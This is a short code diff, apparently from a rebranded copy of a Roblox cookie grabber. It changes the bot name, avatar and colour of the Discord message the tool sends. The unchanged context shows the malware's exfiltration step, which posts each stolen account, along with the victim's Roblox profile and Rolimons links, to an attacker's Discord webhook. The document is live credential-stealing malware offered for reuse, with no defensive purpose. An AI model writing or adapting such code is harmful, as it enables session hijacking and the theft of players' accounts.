@@ -222,21 +222,21 @@ discord = Discord(url=webhookk)
 
 discord.post(
 
-    username="BOT - Pirate 🍪",
+    username="Cookie Nuker ☢️",
 
-    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
+    avatar_url="https://cdn.discordapp.com/attachments/1120704134799183933/1248305290399449098/image.png?ex=6680d825&is=667f86a5&hm=3eb15510d90d6f33e4e5e3d5e294e04da6d19c70ad1306fdb825bbf21c699feb&",
 
     embeds=[
 
         {
 
-            "username": "BOT - Pirate 🍪",
+            "username": "Cookie Nuker ☢️",
 
             "title": "💸 +1 Result Account 🕯️",
 
             "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
 
-            "color" : 12452044,
+            "color" : 16776960,
 
             "fields": [
 
